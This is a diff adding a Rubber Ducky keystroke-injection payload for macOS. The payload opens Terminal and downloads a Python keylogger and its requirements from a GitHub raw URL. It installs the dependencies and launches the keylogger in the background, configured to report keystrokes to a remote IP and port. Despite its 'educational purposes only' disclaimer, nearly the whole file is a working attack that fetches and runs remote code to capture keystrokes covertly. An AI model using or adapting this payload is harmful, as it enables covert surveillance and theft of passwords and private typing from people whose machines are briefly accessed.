@@ -1,0 +1,47 @@
+REM Rubber Ducky Payload for Python Keylogger (macOS)
+REM Educational purposes only - Use only on systems you own or have permission to test
+REM This payload downloads the keylogger, sets config via env vars, installs deps, and runs it
+
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 1500
+
+REM Set configuration - CHANGE THESE VALUES
+export KEYLOGGER_IP="192.168.1.100"
+export KEYLOGGER_PORT="8080"
+export KEYLOGGER_INTERVAL="10"
+export KEYLOGGER_USE_TLS="false"
+export KEYLOGGER_LOG_LEVEL="WARNING"
+export KEYLOGGER_LOG_FILE="/tmp/keylogger.log"
+
+DELAY 500
+
+REM Navigate to temp directory
+cd /tmp
+DELAY 500
+
+REM Download keylogger script directly (no git needed)
+curl -sL "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/keylogger_configurable.py" -o keylogger_configurable.py
+DELAY 3000
+
+REM Download requirements
+curl -sL "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/requirements.txt" -o requirements.txt
+DELAY 2000
+
+REM Install dependencies
+pip3 install -r requirements.txt -q
+DELAY 15000
+
+REM Run keylogger in background
+nohup python3 keylogger_configurable.py > /dev/null 2>&1 &
+DELAY 1000
+
+REM Clean up downloaded files (optional)
+REM rm keylogger_configurable.py requirements.txt
+
+DELAY 500
+STRING exit
+ENTER
